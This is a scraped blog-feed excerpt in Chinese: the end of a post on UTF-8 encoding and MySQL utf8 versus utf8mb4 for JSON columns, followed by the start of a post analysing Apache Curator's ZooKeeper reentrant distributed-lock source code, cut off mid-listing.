&lt;p&gt;&lt;span&gt;UTF-8使用1个字节表示ASCII集中的字符，使用2个字节表示其他几个字母块中的字符，使用3个字节表示BMP的其余部分，补充字符使用4个字节。UTF-16对BMP中的任何字符使用2个字节，对补充字符使用4个字节。UTF-32对所有字符使用4个字节。&lt;/span&gt;基本多语言平面对应代码点存储的是常用字符，上述针对不同字符在其对应代码点，然后计算出该字符的16进制的字符串，举个栗子，将【好】字进行UTF-8编码看看该字符的字节值和字节数，如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
            &lt;span&gt;var&lt;/span&gt; bytes = Encoding.UTF8.GetBytes(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;好&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; hexString = BitConverter.ToString(bytes);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/589642/202003/589642-20200328172046858-1594731230.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;到此我们大概了解完了字符编码，接下来我们再次回到上一节的问题，上一节将我姓名作为JSON存储到数据库中去，但是最终获取数据时，将出现乱码，因为其表编码为utf8，最终将表编码修改为utf8mb4才好使，为啥utf8就不行呢？&lt;span&gt;通过上述对utf8的定义最多可以有4个字节，支持补充字符，所以MySQL根本就没有实现标准的utf8编码，换句话说只是部分实现了utf8编码，MySQL中的utf8又名为utf8mb3，也就是一个字符最多可通过3个字节表示且包含BMP字符，而不包含补充字符。&lt;/span&gt;所以无论是我的姓还是名虽然是3个字节，但是并非常用BMP字符导致。但是针对列类型为JSON类型，事实是对于获取中文真的会乱码吗？上文我用到的MySQL版本为5.7+，如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/589642/202003/589642-20200329030711775-116687787.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;接下来我们利用MySQL 8.0再来进行测试发现不会乱码，创建类和表配置编码如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/589642/202003/589642-20200328182903840-791873116.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; t1
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; id { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; jdoc { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/589642/202003/589642-20200328181332196-1014392214.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/589642/202003/589642-20200328181346442-1354084879.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
        &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Main(&lt;span&gt;string&lt;/span&gt;&lt;span&gt;[] args)
        {

            SetDialect(Dialect.MySQL);

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; con = &lt;span&gt;new&lt;/span&gt; MySqlConnection(&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;Server=localhost;Database=user;Uid=root;Pwd=root;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; id = con.Insert(&lt;span&gt;new&lt;/span&gt; t1() { jdoc = JsonConvert.SerializeObject(&lt;span&gt;new&lt;/span&gt; { Data = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;汪鹏&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; }) });

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; result = con.QueryFirstOrDefault&amp;lt;t1&amp;gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;select * from t1 where id = @id&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;new&lt;/span&gt;&lt;span&gt; { id });

            Console.ReadKey();
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/589642/202003/589642-20200328181553564-865652943.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;随着移动端的兴起，有了表情的出现，所以&lt;span&gt;从MySQL 5.5.3开始，引入utf8mb4字符集每个字符最多可使用4个字节，支持补充字符，对于BMP字符，utf8 [utf8mb3]和utf8mb4具有相同的存储特征：相同的代码值，相同的编码，相同的长度，对于补充字符，utf8 [utf8mb3]根本无法存储该字符，而utf8mb4需要4个字节来存储它，由于utf8 [utf8mb3]根本无法存储字符，因此在utf8 [utf8mb3]列中没有任何补充字符。&lt;/span&gt;接下来我们在针对JSON类型配置为utf8编码的情况下，我们来插入表情，此时会发现也是可以的。我们是可以获取对应字符的字节数，比如如下哭笑不得的表情为4个字节：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;var&lt;/span&gt; emotion = Encoding.UTF8.GetByteCount(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;😂&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/589642/202003/589642-20200328182203616-244646736.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/589642/202003/589642-20200328182243334-2107315663.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;其实针对JSON类型获取数据乱码的情况早就有人提出过相关bug，详见地址《&lt;a href=&quot;https://bugs.mysql.com/bug.php?id=81677&quot;&gt;https://bugs.mysql.com/bug.php?id=81677&lt;/a&gt;》，不过官方一直没有任何回复，至少通过上述测试出来的结果对于utf8存储表情也可以，到底具体情况咋回事，我们还是看看8.0版本以对utf8编码描述为准，详情请见《&lt;a href=&quot;https://dev.mysql.com/doc/refman/8.0/en/charset-unicode.html&quot;&gt;https://dev.mysql.com/doc/refman/8.0/en/charset-unicode.html&lt;/a&gt;》，对于utf8编码的描述依然还是最多可存储3个字节，如下：&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/589642/202003/589642-20200328184016006-358165720.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;别忘记，还有注意：&lt;span&gt;utf8[utf8mb3]字符集已被弃用，并会在将来的MySQL版本中移除，请改用utf8mb4，尽管utf8当前是utf8mb3的别名，但在某些时候utf8将成为对utf8mb4的引用，为避免对utf8的含义含糊不清，请考虑为字符集引用显式指定utf8mb4而不是utf8。&lt;/span&gt;所以到此我们已明了，针对8.0版本中的utf8编码虽说最多可支持3个字节，但是，会将utf8成为utf8mb4的引用，如此就不难理解为何上述将表配置为utf8编码时，对于JSON类型的不在常用BMP字符进行数据存储和表情皆没问题。&lt;/p&gt;
&lt;h2&gt;总结&lt;/h2&gt;
&lt;p&gt;通过此文对utf8编码的JSON类型的数据出现中文乱码的问题的学习才算告一段落， 原来版本问题使得utf8存在对utf8mb4编码的引用，知其然，知其所以然，嗯，大概是这么个道理。发表博客的好处就在这里，没有批评和指正，哪来的更进一步呢。&lt;/p&gt;
</description>
<pubDate>Sun, 29 Mar 2020 23:46:00 +0000</pubDate>
<dc:creator>Jeffcky</dc:creator>
<og:description>前言 继上文发表之后，结合评论意见并亲自验证最终发现是编码的问题，但是对于字符编码还是有点不解，于是乎，有了本文，我们来学习字符编码，在学习的过程中，我发现对于MySQL中JSON类型的编码导致数据中</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/CreateMyself/p/12587426.html</dc:identifier>
</item>
<item>
<title>【分布式锁】06-Zookeeper实现分布式锁：可重入锁源码分析 - 一枝花算不算浪漫</title>
<link>http://www.cnblogs.com/wang-meng/p/12593992.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wang-meng/p/12593992.html</guid>
<description>&lt;h3 id=&quot;h&quot;&gt;前言&lt;/h3&gt;
&lt;p&gt;前面已经讲解了Redis的客户端Redission是怎么实现分布式锁的，大多都深入到源码级别。&lt;/p&gt;
&lt;p&gt;在分布式系统中，常见的分布式锁实现方案还有Zookeeper，接下来会深入研究Zookeeper是如何来实现分布式锁的。&lt;/p&gt;
&lt;h3 id=&quot;hzookeeper&quot;&gt;Zookeeper初识&lt;/h3&gt;
&lt;h4 id=&quot;h-1&quot;&gt;文件系统&lt;/h4&gt;
&lt;p&gt;Zookeeper维护一个类似文件系统的数据结构&lt;/p&gt;
&lt;p&gt;&lt;img title=&quot;image.png&quot; src=&quot;https://i.loli.net/2020/03/29/K3GNLxaQfXBlypq.png&quot; alt=&quot;image.png&quot;/&gt;image.png&lt;/p&gt;
&lt;p&gt;每个子目录项如NameService都被称为znoed,和文件系统一样，我们能够自由的增加、删除znode,在znode下增加、删除子znode,唯一不同的在于znode是可以存储数据的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;有4种类型的znode&lt;/strong&gt;&lt;/p&gt;
&lt;ul readability=&quot;2&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;PERSISTENT--持久化目录节点客户端与zookeeper断开连接后，该节点依旧存在&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;PERSISTENT_SEQUENTIAL-持久化顺序编号目录节点客户端与zookeeper断开连接后，该节点依旧存在，只是Zookeeper给该节点名称进行顺序编号&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;EPHEMERAL-临时目录节点客户端与zookeeper断开连接后，该节点被删除&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;EPHEMERAL_SEQUENTIAL-临时顺序编号目录节点客户端与zookeeper断开连接后，该节点被删除，只是Zookeeper给该节点名称进行顺序编号&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;h-2&quot;&gt;通知机制&lt;/h4&gt;
&lt;p&gt;客户端注册监听它关心的目录节点，当目录节点发生变化（数据改变、被删除、子目录节点增加删除）等，zookeeper会通知客户端。&lt;/p&gt;
&lt;h4 id=&quot;h-3&quot;&gt;分布式锁&lt;/h4&gt;
&lt;p&gt;有了zookeeper的一致性文件系统，锁的问题变得容易。锁服务可以分为两类，一个是保持独占，另一个是控制时序。&lt;/p&gt;
&lt;ol readability=&quot;1.5&quot;&gt;&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;对于第一类，我们将zookeeper上的一个znode看作是一把锁，通过create znode的方式来实现。所有客户端都去创建 /distribute_lock 节点，最终成功创建的那个客户端也即拥有了这把锁。厕所有言：来也冲冲，去也冲冲，用完删除掉自己创建的distribute_lock 节点就释放出锁。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;对于第二类， /distribute_lock 已经预先存在，所有客户端在它下面创建临时顺序编号目录节点，和选master一样，编号最小的获得锁，用完删除自己创建的znode节点。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img title=&quot;image.png&quot; src=&quot;https://i.loli.net/2020/03/29/7wcpLY1VGSDJO4d.png&quot; alt=&quot;image.png&quot;/&gt;image.png&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注明&lt;/strong&gt;：以上内容参考 https://www.cnblogs.com/dream-to-pku/p/9513188.html&lt;/p&gt;
&lt;h3 id=&quot;hcurator&quot;&gt;Curator框架初识&lt;/h3&gt;
&lt;p&gt;Curator是Netflix公司开源的一套Zookeeper客户端框架。目前已经作为Apache的顶级项目出现，是最流行的Zookeeper客户端之一。&lt;/p&gt;
&lt;p&gt;我们看下Apache Curator官网的介绍：&lt;/p&gt;
&lt;p&gt;&lt;img title=&quot;image.png&quot; src=&quot;https://i.loli.net/2020/03/26/i58NkGqUfDRQtw2.png&quot; alt=&quot;image.png&quot;/&gt;image.png&lt;/p&gt;
&lt;p&gt;接着看下quick start中关于分布式锁相关的内容&lt;br/&gt;地址为：http://curator.apache.org/getting-started.html&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
InterProcessMutex lock = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; InterProcessMutex(client, lockPath);
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; ( lock.acquire(maxWait, waitUnit) ) 
{
    &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; 
    {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; do some work inside of the critical section here&lt;/span&gt;
&lt;span&gt;    }
    &lt;/span&gt;&lt;span&gt;finally&lt;/span&gt;&lt;span&gt;
    {
        lock.release();
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;使用很简单，使用&lt;code&gt;InterProcessMutex&lt;/code&gt;类，使用其中的&lt;code&gt;acquire()&lt;/code&gt;方法，就可以获取一个分布式锁了。&lt;/p&gt;
&lt;h3 id=&quot;hcurator-1&quot;&gt;Curator分布式锁使用示例&lt;/h3&gt;
&lt;p&gt;启动两个线程t1和t2去争夺锁，拿到锁的线程会占用5秒。运行多次可以观察到，有时是t1先拿到锁而t2等待，有时又会反过来。Curator会用我们提供的lock路径的结点作为全局锁，这个结点的数据类似这种格式：&lt;strong&gt;[_c_64e0811f-9475-44ca-aa36-c1db65ae5350-lock-00000000001]&lt;/strong&gt;，每次获得锁时会生成这种串，释放锁时清空数据。&lt;/p&gt;
&lt;p&gt;接下来看看加锁的示例：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Application {
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; String ZK_ADDRESS = &quot;192.20.38.58:2181&quot;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; String ZK_LOCK_PATH = &quot;/locks/lock_01&quot;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; main(String[] args) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; InterruptedException {
        CuratorFramework client &lt;/span&gt;=&lt;span&gt; CuratorFrameworkFactory.newClient(
                ZK_ADDRESS,
                &lt;/span&gt;&lt;span&gt;new&lt;/span&gt; RetryNTimes(10, 5000&lt;span&gt;)
        );
        client.start();
        System.out.println(&lt;/span&gt;&quot;zk client start successfully!&quot;&lt;span&gt;);

        Thread t1 &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; Thread(() -&amp;gt;&lt;span&gt; {
            doWithLock(client);
        }, &lt;/span&gt;&quot;t1&quot;&lt;span&gt;);
        Thread t2 &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; Thread(() -&amp;gt;&lt;span&gt; {
            doWithLock(client);
        }, &lt;/span&gt;&quot;t2&quot;&lt;span&gt;);

        t1.start();
        t2.start();
    }

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; doWithLock(CuratorFramework client) {
        InterProcessMutex lock &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; InterProcessMutex(client, ZK_LOCK_PATH);
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (lock.acquire(10 * 1000&lt;span&gt;, TimeUnit.SECONDS)) {
                System.out.println(Thread.currentThread().getName() &lt;/span&gt;+ &quot; hold lock&quot;&lt;span&gt;);
                Thread.sleep(&lt;/span&gt;5000L&lt;span&gt;);
                System.out.println(Thread.currentThread().getName() &lt;/span&gt;+ &quot; release lock&quot;&lt;span&gt;);
            }
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Exception e) {
            e.printStackTrace();
        } &lt;/span&gt;&lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
                lock.release();
            } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Exception e) {
                e.printStackTrace();
            }
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;运行结果：&lt;/p&gt;
&lt;p&gt;&lt;img title=&quot;image.png&quot; src=&quot;https://i.loli.net/2020/03/26/W1sDkLJuNUbAzXx.png&quot; alt=&quot;image.png&quot;/&gt;image.png&lt;/p&gt;
&lt;h3 id=&quot;hcurator-2&quot;&gt;Curator 加锁实现原理&lt;/h3&gt;
&lt;p&gt;直接看Curator加锁的代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;45&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; InterProcessMutex &lt;span&gt;implements&lt;/span&gt; InterProcessLock, Revocable&amp;lt;InterProcessMutex&amp;gt;&lt;span&gt; {

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; ConcurrentMap&amp;lt;Thread, LockData&amp;gt;   threadData =&lt;span&gt; Maps.newConcurrentMap();

     &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; LockData
    {
        &lt;/span&gt;&lt;span&gt;final&lt;/span&gt;&lt;span&gt; Thread        owningThread;
        &lt;/span&gt;&lt;span&gt;final&lt;/span&gt;&lt;span&gt; String        lockPath;
        &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; AtomicInteger lockCount = &lt;span&gt;new&lt;/span&gt; AtomicInteger(1&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; LockData(Thread owningThread, String lockPath)
        {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.owningThread =&lt;span&gt; owningThread;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.lockPath =&lt;span&gt; lockPath;
        }
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt; acquire(&lt;span&gt;long&lt;/span&gt; time, TimeUnit unit) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception
    {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; internalLock(time, unit);
    }


     &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt; internalLock(&lt;span&gt;long&lt;/span&gt; time, TimeUnit unit) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception
    {
        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;
           Note on concurrency: a given lockData instance
           can be only acted on by a single thread so locking isn't necessary
        &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;

        Thread          currentThread &lt;/span&gt;=&lt;span&gt; Thread.currentThread();

        LockData        lockData &lt;/span&gt;=&lt;span&gt; threadData.get(currentThread);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; ( lockData != &lt;span&gt;null&lt;/span&gt;&lt;span&gt; )
        {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; re-entering&lt;/span&gt;
&lt;span&gt;            lockData.lockCount.incrementAndGet();
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
        }

        String lockPath &lt;/span&gt;=&lt;span&gt; internals.attemptLock(time, unit, getLockNodeBytes());
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; ( lockPath != &lt;span&gt;null&lt;/span&gt;&lt;span&gt; )
        {
            LockData        newLockData &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; LockData(currentThread, lockPath);
            threadData.put(currentThread, newLockData);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
    }   
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;直接看&lt;code&gt;internalLock()&lt;/code&gt;方法，首先是获取当前线程，然后查看当前线程是否在一个concurrentHashMap中，这里是&lt;code&gt;重入锁&lt;/code&gt;的实现，如果当前已经已经获取了锁，那么这个线程获取锁的次数再+1&lt;/p&gt;
&lt;p&gt;如果没有获取锁，那么就是用&lt;code&gt;attemptLock()&lt;/code&gt;方法去尝试获取锁，如果&lt;code&gt;lockPath&lt;/code&gt;不为空，说明获取锁成功，并将当前线程放入到map中。&lt;/p&gt;
&lt;p&gt;接下来看看核心的加锁逻辑&lt;code&gt;attemptLock()&lt;/code&gt;方法：&lt;/p&gt;
&lt;p&gt;入参：&lt;br/&gt;&lt;code&gt;time&lt;/code&gt; : 获取锁等待的时间&lt;br/&gt;&lt;code&gt;unit&lt;/code&gt;：时间单位&lt;br/&gt;&lt;code&gt;lockNodeBytes&lt;/code&gt;：默认为null&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;45&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; LockInternals {    
    String attemptLock(&lt;/span&gt;&lt;span&gt;long&lt;/span&gt; time, TimeUnit unit, &lt;span&gt;byte&lt;/span&gt;[] lockNodeBytes) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception
    {
        &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; &lt;span&gt;long&lt;/span&gt;      startMillis =&lt;span&gt; System.currentTimeMillis();
        &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; Long      millisToWait = (unit != &lt;span&gt;null&lt;/span&gt;) ? unit.toMillis(time) : &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; &lt;span&gt;byte&lt;/span&gt;[]    localLockNodeBytes = (revocable.get() != &lt;span&gt;null&lt;/span&gt;) ? &lt;span&gt;new&lt;/span&gt; &lt;span&gt;byte&lt;/span&gt;[0&lt;span&gt;] : lockNodeBytes;
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;             retryCount = 0&lt;span&gt;;

        String          ourPath &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;boolean&lt;/span&gt;         hasTheLock = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;boolean&lt;/span&gt;         isDone = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;while&lt;/span&gt; ( !&lt;span&gt;isDone )
        {
            isDone &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;

            &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;
            {
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; ( localLockNodeBytes != &lt;span&gt;null&lt;/span&gt;&lt;span&gt; )
                {
                    ourPath &lt;/span&gt;=&lt;span&gt; client.create().creatingParentsIfNeeded().withProtection().withMode(CreateMode.EPHEMERAL_SEQUENTIAL).forPath(path, localLockNodeBytes);
                }
                &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
                {
                    ourPath &lt;/span&gt;=&lt;span&gt; client.create().creatingParentsIfNeeded().withProtection().withMode(CreateMode.EPHEMERAL_SEQUENTIAL).forPath(path);
                }
                hasTheLock &lt;/span&gt;=&lt;span&gt; internalLockLoop(startMillis, millisToWait, ourPath);
            }
            &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; ( KeeperException.NoNodeException e )
            {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; gets thrown by StandardLockInternalsDriver when it can't find the lock node
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; this can happen when the session expires, etc. So, if the retry allows, just try it all again&lt;/span&gt;
                &lt;span&gt;if&lt;/span&gt; ( client.getZookeeperClient().getRetryPolicy().allowRetry(retryCount++, System.currentTimeMillis() -&lt;span&gt; startMillis, RetryLoop.getDefaultRetrySleeper()) )
                {
                    isDone &lt;/span&gt;= &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
                }
                &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
                {
                    &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt;&lt;span&gt; e;
                }
            }
        }

        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; ( hasTheLock )
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; ourPath;
        }

        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;ourPath = client.create().creatingParentsIfNeeded().withProtection().withMode(CreateMode.EPHEMERAL_SEQUENTIAL).forPath(path);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;使用的临时顺序节点，首先他是临时节点，如果当前这台机器如果自己宕机的话，他创建的这个临时节点就会自动消失，如果有获取锁的客户端宕机了，zk可以保证锁会自动释放的&lt;/p&gt;
&lt;p&gt;创建的数据结构类似于：&lt;/p&gt;

&lt;p&gt;客户端A获取锁的代码，生成的ourPath=xxxx01&lt;/p&gt;
&lt;p&gt;&lt;img title=&quot;image.png&quot; src=&quot;https://i.loli.net/2020/03/29/kQZFdgifxMNEBte.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;

&lt;p&gt;客户端B获取锁的代码，生成的ourPath=xxxx02&lt;img title=&quot;image.png&quot; src=&quot;https://i.loli.net/2020/03/29/i5hIPkWqCr34Zc6.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;

&lt;p&gt;查看Zookeeper中/locks/lock_01下所有临时节点数据：&lt;/p&gt;
&lt;p&gt;&lt;img title=&quot;image.png&quot; src=&quot;https://i.loli.net/2020/03/29/WJbNpxqUd94uiaZ.png&quot; alt=&quot;image.png&quot;/&gt;PS：01/02的图没有截到，这里又跑了一次截图所示 03/04 的顺序节点在ZK中的显示&lt;/p&gt;
&lt;p&gt;接着重点看&lt;code&gt;interalLockLoop()&lt;/code&gt;的逻辑：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; LockInternals {
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt; internalLockLoop(&lt;span&gt;long&lt;/span&gt; startMillis, Long millisToWait, String ourPath) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception
    {
        &lt;/span&gt;&lt;span&gt;boolean&lt;/span&gt;     haveTheLock = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;boolean&lt;/span&gt;     doDelete = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; ( revocable.get() != &lt;span&gt;null&lt;/span&gt;&lt;span&gt; )
            {
                client.getData().usingWatcher(revocableWatcher).forPath(ourPath);
            }

            &lt;/span&gt;&lt;span&gt;while&lt;/span&gt; ( (client.getState() == CuratorFrameworkState.STARTED) &amp;amp;&amp;amp; !&lt;span&gt;haveTheLock )
            {
                List&lt;/span&gt;&amp;lt;String&amp;gt;        children =&lt;span&gt; getSortedChildren();
                String              sequenceNodeName &lt;/span&gt;= ourPath.substring(basePath.length() + 1); &lt;span&gt;//&lt;/span&gt;&lt;span&gt; +1 to include the slash&lt;/span&gt;
&lt;span&gt;
                PredicateResults    predicateResults &lt;/span&gt;=&lt;span&gt; driver.getsTheLock(client, children, sequenceNodeName, maxLeases);
